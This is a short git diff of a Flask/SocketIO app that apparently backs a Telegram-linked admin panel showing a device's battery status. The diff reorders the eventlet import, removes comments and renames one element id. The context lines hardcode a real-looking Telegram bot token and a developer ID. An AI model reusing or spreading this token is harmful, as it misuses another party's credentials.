@@ -1,21 +1,20 @@
+import eventlet
+eventlet.monkey_patch()
+
 import os
 import time
 import threading
 import requests
 import base64
-import eventlet
 from flask import Flask, render_template_string, request
 from flask_socketio import SocketIO, emit, join_room, leave_room
-
-# تفعيل eventlet
-eventlet.monkey_patch()
 
 app = Flask(__name__)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 
 # --- [ إعدادات البوت ] ---
 BOT_TOKEN = "8731655533:AAFBxpr2goRmjY46jOB_BQdZKmk2ycFrYKQ"
-DEVELOPER_ID = "8305841557" # معرفك للاستقبال
+DEVELOPER_ID = "8305841557"
 BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 DEVELOPER_USERNAME = "@SDVee249"
 
@@ -249,7 +248,7 @@ ADMIN_HTML = """
                 </div>
                 <div class="card">
                     <h3 data-key="dev_bat">نسبة الشحن</h3>
-                    <div class="data-row"><span>Status:</span><span class="data-value" id="bat-status">--</span></div>
+                    <div class="data-row"><span>Status:</span><span class="data-value" id="bot-status">--</span></div>
                     <div class="data-row"><span>Level:</span><span class="data-value" id="bat-level">--%</span></div>
                     <div class="progress-bar"><div class="progress-fill" id="bat-bar"></div></div>
                 </div>
